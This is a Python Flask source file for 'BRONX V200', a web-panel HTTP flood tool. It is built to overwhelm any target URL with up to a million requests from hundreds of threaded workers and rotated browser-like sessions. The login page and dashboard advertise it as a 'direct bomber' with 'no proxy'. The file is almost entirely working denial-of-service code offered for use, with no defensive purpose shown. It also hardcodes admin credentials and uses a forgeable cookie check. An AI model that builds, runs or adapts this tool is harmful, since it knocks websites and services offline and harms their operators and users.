from flask import Flask, request, jsonify, render_template_string, make_response
import requests
import threading
import time
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import os

urllib3.disable_warnings()
app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

# ========== ATTACK SYSTEM ==========
active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
total_lifetime = {"success": 0, "failed": 0, "total": 0}
attack_logs = []
multi_session_enabled = False
session_pool = []

# ========== CREATE SESSIONS ==========
def create_sessions(count=1000):
    global session_pool
    session_pool = []
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    ]
    
    for i in range(count):
        s = requests.Session()
        s.headers.update({
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
        })
        session_pool.append(s)
    return len(session_pool)

# ========== DIRECT ATTACK WORKER ==========
def direct_attack_worker(attack_id, url, count, use_multi):
    success_count = 0
    fail_count = 0
    
    for i in range(count):
        if attack_id not in active_attacks:
            break
        
        try:
            if use_multi and session_pool:
                session = random.choice(session_pool)
            else:
                session = requests.Session()
                session.headers.update({"User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
                ])})
            
            resp = session.get(url, timeout=15, verify=False, allow_redirects=True)
            
            if resp.status_code < 500:
                success_count += 1
            else:
                fail_count += 1
                
        except:
            fail_count += 1
    
    with threading.Lock():
        attack_stats["success"] += success_count
        attack_stats["failed"] += fail_count
        attack_stats["total"] += (success_count + fail_count)
        total_lifetime["success"] += success_count
        total_lifetime["failed"] += fail_count
        total_lifetime["total"] += (success_count + fail_count)
    
    return success_count, fail_count

def run_attack(attack_id, url, total_count, workers, use_multi):
    attack_logs.append(f"⚡ LAUNCHED: {url} | {total_count} REQ | {workers} WORKERS | MULTI: {'ON' if use_multi else 'OFF'}")
    
    per_worker = max(1, total_count // workers)
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = []
        for _ in range(workers):
            futures.append(executor.submit(direct_attack_worker, attack_id, url, per_worker, use_multi))
        
        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass
    
    if attack_id in active_attacks:
        del active_attacks[attack_id]
    
    attack_logs.append(f"✅ DONE: {url} | S:{attack_stats['success']} F:{attack_stats['failed']}")

# ========== HTML ==========
LOGIN_HTML = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX V200</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050005;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:system-ui,sans-serif;overflow:hidden}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(ellipse at center,rgba(255,0,85,0.06) 0%,rgba(0,200,255,0.03) 50%,transparent 70%);pointer-events:none;z-index:0}
.box{background:rgba(10,0,5,0.95);padding:50px 40px;border-radius:24px;border:1px solid rgba(255,0,85,0.2);width:420px;text-align:center;position:relative;z-index:1;box-shadow:0 0 80px rgba(255,0,85,0.1),0 0 150px rgba(255,215,0,0.05)}
.logo{font-size:4.5em;animation:pulse 2s infinite}@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.15) filter:drop-shadow(0 0 20px rgba(255,0,85,0.8))}}
h1{font-size:2.2em;font-weight:900;background:linear-gradient(135deg,#ff0055,#ffd700,#00ff88,#00c8ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px;margin:10px 0}
.tag{color:#ff0055;font-size:0.65em;letter-spacing:6px;text-transform:uppercase;margin:8px 0;animation:glow 2s infinite}@keyframes glow{50%{text-shadow:0 0 20px #ff0055,0 0 40px #ff0055}}
.info{color:#888;font-size:0.5em;letter-spacing:2px;margin:6px 0;line-height:1.5}
input{width:100%;padding:16px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,0,85,0.15);border-radius:12px;color:#fff;margin:10px 0;font-size:15px;transition:0.3s}
input:focus{border-color:#ff0055;box-shadow:0 0 30px rgba(255,0,85,0.3);outline:none}
.btn{width:100%;padding:16px;background:linear-gradient(135deg,#ff0055,#ffd700);color:#000;border:none;border-radius:12px;font-weight:800;cursor:pointer;font-size:15px;margin-top:15px;letter-spacing:3px;transition:0.3s}
.btn:hover{box-shadow:0 0 60px rgba(255,0,85,0.8);transform:translateY(-3px)}
.btn:active{transform:scale(0.95)}
.error{color:#ff0055;margin-top:10px;font-size:0.8em;animation:shake 0.5s}@keyframes shake{25%{transform:translateX(-5px)}50%{transform:translateX(5px)}75%{transform:translateX(-5px)}}
</style></head><body>
<div class="box"><div class="logo">💀</div><h1>BRONX V200</h1><div class="tag">DIRECT BOMBER GOD</div><div class="info">⚡ 1000 SESSIONS • DIRECT HIT • NO PROXY • 100% WORKING ⚡</div>
<form method="post"><input type="text" name="user" placeholder="USERNAME"><input type="password" name="pass" placeholder="PASSWORD"><button class="btn" type="submit">☠️ ACCESS SYSTEM</button></form>
{% if error %}<p class="error">{{ error }}</p>{% endif %}</div></body></html>"""

DASH_HTML = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX V200 PANEL</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050005;color:#e0e0e0;font-family:system-ui,sans-serif;padding:15px;min-height:100vh}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(ellipse at 50% 0%,rgba(255,0,85,0.04),transparent 60%),radial-gradient(ellipse at 80% 100%,rgba(0,200,255,0.03),transparent 50%);pointer-events:none;z-index:0}
.container{max-width:1400px;margin:0 auto;position:relative;z-index:1}
.header{display:flex;justify-content:space-between;align-items:center;padding:20px 25px;border:1px solid rgba(255,0,85,0.15);border-radius:16px;margin-bottom:18px;background:rgba(255,0,85,0.02);flex-wrap:wrap;gap:12px;animation:headerGlow 3s infinite}@keyframes headerGlow{50%{border-color:rgba(255,0,85,0.4);box-shadow:0 0 30px rgba(255,0,85,0.1)}}
.header h1{font-size:1.6em;font-weight:900;background:linear-gradient(135deg,#ff0055,#ffd700,#00ff88,#00c8ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px}
.header-info{color:#888;font-size:0.5em;letter-spacing:2px}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:18px}
.stat{background:rgba(255,0,85,0.02);border:1px solid rgba(255,0,85,0.1);border-radius:14px;padding:18px;text-align:center;transition:0.3s}
.stat:hover{border-color:#ff0055;box-shadow:0 0 25px rgba(255,0,85,0.15)}
.stat-val{font-size:2.2em;font-weight:900}.s{color:#00ff88}.f{color:#ff0055}.t{color:#ffd700}.b{color:#00c8ff}
.stat-label{font-size:0.55em;text-transform:uppercase;letter-spacing:3px;color:#666;margin-top:4px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(400px,1fr));gap:14px;margin-bottom:18px}
.card{background:rgba(255,0,85,0.01);border:1px solid rgba(255,0,85,0.08);border-radius:14px;padding:22px;transition:0.3s}
.card:hover{border-color:rgba(255,0,85,0.2)}
.card h3{font-size:0.7em;font-weight:700;letter-spacing:3px;text-transform:uppercase;margin-bottom:14px;color:#ff0055}
input,select,textarea{width:100%;padding:12px 14px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,0,85,0.1);border-radius:8px;color:#fff;margin:4px 0;font-size:12px;font-family:inherit;resize:vertical;transition:0.2s}
input:focus,select:focus,textarea:focus{border-color:#ff0055;box-shadow:0 0 20px rgba(255,0,85,0.2);outline:none}
label{font-size:0.55em;text-transform:uppercase;letter-spacing:2px;color:#888;display:block;margin-top:8px}
.btn{width:100%;padding:12px;background:linear-gradient(135deg,#ff0055,#ffd700);color:#000;border:none;border-radius:8px;font-weight:700;cursor:pointer;font-size:0.7em;letter-spacing:2px;text-transform:uppercase;margin:5px 0;transition:0.3s}
.btn:hover{box-shadow:0 0 40px rgba(255,0,85,0.6);transform:translateY(-2px)}
.btn-danger{background:rgba(255,0,0,0.1);color:#ff4444;border:1px solid rgba(255,0,0,0.2)}.btn-danger:hover{box-shadow:0 0 25px rgba(255,0,0,0.4)}
.btn-green{background:rgba(0,255,136,0.1);color:#00ff88;border:1px solid rgba(0,255,136,0.2)}.btn-green:hover{box-shadow:0 0 25px rgba(0,255,136,0.3)}
.btn-blue{background:rgba(0,200,255,0.1);color:#00c8ff;border:1px solid rgba(0,200,255,0.2)}
.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.logs{background:rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.03);border-radius:10px;padding:14px;max-height:280px;overflow:auto;font-size:0.6em;font-family:monospace;color:#00ff88}
.log-e{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.015);color:#888}
.badge{display:inline-block;padding:4px 12px;border-radius:20px;font-size:0.55em;letter-spacing:2px;text-transform:uppercase}
.badge-on{background:rgba(0,255,136,0.1);color:#00ff88;animation:blink 1.5s infinite}@keyframes blink{50%{opacity:0.3}}
.badge-off{background:rgba(255,0,0,0.1);color:#ff4444}
.toggle-row{display:flex;align-items:center;gap:10px;margin:10px 0}
.toggle{width:48px;height:26px;background:rgba(255,255,255,0.06);border-radius:13px;cursor:pointer;position:relative;transition:0.3s}
.toggle.on{background:#00ff88;box-shadow:0 0 20px rgba(0,255,136,0.3)}.toggle::after{content:'';position:absolute;top:3px;left:3px;width:20px;height:20px;background:#fff;border-radius:50%;transition:0.3s}.toggle.on::after{left:25px}
.footer{text-align:center;padding:15px;color:rgba(255,255,255,0.1);font-size:0.5em;letter-spacing:3px}
</style></head><body>
<div class="container">
<div class="header"><div><h1>💀 BRONX V200</h1><div class="header-info">DIRECT BOMBER GOD • 1000 SESSIONS • NO PROXY</div></div>
<div style="display:flex;gap:10px;align-items:center"><span style="color:#666;font-size:0.6em" id="liveTime"></span><a href="/logout" style="color:#ff0055;text-decoration:none;font-size:0.6em;letter-spacing:2px">⏏️ LOGOUT</a></div></div>

<div class="stats">
<div class="stat"><div class="stat-val s" id="succ">0</div><div class="stat-label">✅ SUCCESS</div></div>
<div class="stat"><div class="stat-val f" id="fail">0</div><div class="stat-label">❌ FAILED</div></div>
<div class="stat"><div class="stat-val t" id="tot">0</div><div class="stat-label">📊 SESSION</div></div>
<div class="stat"><div class="stat-val b" id="asess">0</div><div class="stat-label">🔗 ACTIVE</div></div>
</div>

<div class="grid">
<div class="card"><h3>🎯 ATTACK CONFIG</h3>
<label>TARGET URL</label><input type="text" id="url" placeholder="https://api.target.com/endpoint">
<div class="row"><div><label>REQUEST COUNT</label><input type="number" id="count" value="10000"></div><div><label>WORKERS (10-500)</label><input type="number" id="workers" value="200" min="10" max="500"></div></div>
<button class="btn" onclick="startAttack()">🚀 LAUNCH DIRECT ATTACK</button>
<button class="btn btn-danger" onclick="stopAttack()">⏹️ STOP ALL</button>
<span id="status" style="margin-top:6px;display:block"></span>
</div>

<div class="card"><h3>🔗 MULTI-SESSION</h3>
<div class="toggle-row"><span style="color:#888;font-size:0.6em">MULTI-SESSION</span><div class="toggle" id="multiTog" onclick="toggleMulti()"></div><span id="multiLab" style="color:#888;font-size:0.6em">OFF</span></div>
<label>MAX SESSIONS (100-1000)</label><input type="number" id="maxSess" value="500" min="100" max="1000">
<button class="btn btn-green" onclick="saveMulti()">💾 SAVE & CREATE SESSIONS</button>
<button class="btn btn-blue" onclick="resetSess()">🔄 RESET SESSIONS</button>
<div style="margin-top:8px;color:#888;font-size:0.6em" id="sessInfo">Sessions: 0</div>
</div>
</div>

<div class="card"><h3>📜 ATTACK LOGS</h3><button class="btn btn-danger" style="margin-bottom:8px" onclick="clearLogs()">🗑️ CLEAR LOGS</button><button class="btn btn-blue" style="margin-bottom:8px" onclick="resetStats()">🔄 RESET STATS</button>
<div class="logs" id="logs"><div class="log-e">💀 BRONX V200 ready. Enter URL and LAUNCH!</div></div></div>
<div class="footer">💀 BRONX V200 • DIRECT BOMBER GOD • 1000 SESSIONS 💀</div></div>

<script>
var multiOn=false;
function toggleMulti(){multiOn=!multiOn;document.getElementById('multiTog').classList.toggle('on',multiOn);document.getElementById('multiLab').textContent=multiOn?'ON':'OFF';document.getElementById('multiLab').style.color=multiOn?'#00ff88':'#888'}
function saveMulti(){var max=document.getElementById('maxSess').value;fetch('/multi_config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:multiOn,max:parseInt(max)})}).then(r=>r.json()).then(d=>{alert(d.status);document.getElementById('sessInfo').textContent='Sessions: '+d.count})}
function resetSess(){fetch('/reset_sessions',{method:'POST'}).then(r=>r.json()).then(d=>{document.getElementById('sessInfo').textContent='Sessions: 0';u()})}
function resetStats(){fetch('/reset_stats',{method:'POST'}).then(()=>u())}
function clearLogs(){fetch('/clear_logs',{method:'POST'}).then(()=>l())}
function startAttack(){var url=document.getElementById('url').value.trim();var count=parseInt(document.getElementById('count').value);var workers=parseInt(document.getElementById('workers').value);if(!url){alert('Enter URL!');return};fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:url,count:count,workers:workers,multi:multiOn})}).then(r=>r.json()).then(d=>{document.getElementById('status').innerHTML='<span class="badge badge-on">ACTIVE</span>';l();u()})}
function stopAttack(){fetch('/stop',{method:'POST'}).then(()=>{document.getElementById('status').innerHTML='<span class="badge badge-off">STOPPED</span>';l()})}
function u(){fetch('/stats').then(r=>r.json()).then(d=>{document.getElementById('succ').textContent=d.success;document.getElementById('fail').textContent=d.failed;document.getElementById('tot').textContent=d.total;document.getElementById('asess').textContent=d.active||0})}
function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>'<div class="log-e">'+x+'</div>').join('')})}
setInterval(function(){l();u();document.getElementById('liveTime').textContent=new Date().toLocaleTimeString()},1000)
</script></body></html>"""

# ========== ROUTES ==========
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN_HTML, error="ACCESS DENIED!")
    return render_template_string(LOGIN_HTML, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return render_template_string(DASH_HTML)

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    url = d.get('url','').strip()
    count = min(int(d.get('count',1000)), 1000000)
    workers = min(int(d.get('workers',200)), 500)
    use_multi = d.get('multi',False)
    
    if not url: return jsonify({"error":"URL required"}),400
    
    aid = str(int(time.time()*1000))
    active_attacks[aid] = True
    
    t = threading.Thread(target=run_attack, args=(aid, url, count, workers, use_multi))
    t.daemon = True
    t.start()
    
    return jsonify({"status":"started","multi":use_multi,"workers":workers})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    return jsonify({"status":"stopped"})

@app.route('/reset_stats', methods=['POST'])
def reset_stats():
    attack_stats["success"] = attack_stats["failed"] = attack_stats["total"] = 0
    return jsonify({"status":"reset"})

@app.route('/reset_sessions', methods=['POST'])
def reset_sessions():
    global session_pool
    session_pool = []
    return jsonify({"status":"reset"})

@app.route('/clear_logs', methods=['POST'])
def clear_logs():
    attack_logs.clear()
    return jsonify({"status":"cleared"})

@app.route('/multi_config', methods=['POST'])
def multi_config():
    global multi_session_enabled
    d = request.get_json()
    multi_session_enabled = d.get('enabled',False)
    max_sess = min(int(d.get('max',500)), 1000)
    
    if multi_session_enabled:
        count = create_sessions(max_sess)
        return jsonify({"status":"created","count":count})
    return jsonify({"status":"disabled","count":0})

@app.route('/logs')
def logs():
    return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})

@app.route('/stats')
def stats():
    return jsonify({**attack_stats, "active":len(active_attacks)})

@app.route('/logout')
def logout():
    return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    port = int(os.environ.get('PORT',5000))
    print("💀 BRONX V200 DIRECT BOMBER READY!")
    print(f"⚡ Port: {port}")
    print(f"🔗 Multi-Session: {len(session_pool)} sessions")
    app.run(host='0.0.0.0', port=port, threaded=True)
